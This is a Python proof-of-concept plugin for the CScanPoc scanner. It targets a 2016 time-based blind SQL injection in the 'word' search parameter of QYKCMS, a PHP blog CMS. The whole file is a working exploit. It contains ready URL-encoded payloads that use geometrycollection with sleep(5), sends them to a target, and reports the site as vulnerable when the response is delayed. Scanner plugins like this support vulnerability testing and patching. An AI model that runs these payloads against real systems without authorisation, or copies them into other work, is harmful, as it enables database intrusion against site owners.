# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'QYKCMS_0001'  # 平台漏洞编号，留空
    name = '青云客博客CMS SQL盲注'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-04-15'  # 漏洞公布时间
    desc = '''
        青云客网站管理系统简称QYKCMS,是青云客开发的一款基于PHP+MySql的轻量级智能建站系统。
        在include/class_temp.php中
        其中变量$word过滤不得当，导致可以注入。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3842/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'QYKCMS(青云客博客CMS)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'de6b63cb-a54d-4f38-96bf-4c75487770d3'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload_sleep = "/?log=blog&seartype=title&word=%E9%9C%87%E6%92%BC%22%20and%20geometrycollection((select%20*from(select%20*%20from%20(select%20sleep%20(5))a)b))%20and%20%221%22=%221"
            payload_normal = "/?log=blog&seartype=title&word=%E9%9C%87%E6%92%BC%22%20and%20geometrycollection((select%20*from(select%20*%20from%20(select%20md5%20(c))a)b))%20and%20%221%22=%221"
            url_sleep = self.target + payload_sleep
            url_normal = self.target + payload_normal
            time_start = time.time()
            requests.get(url_normal)
            time_end_normal = time.time()
            requests.get(url_sleep)
            time_end_sleep = time.time()

            if (time_end_sleep-time_end_normal)-(time_end_normal-time_start) > 4:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
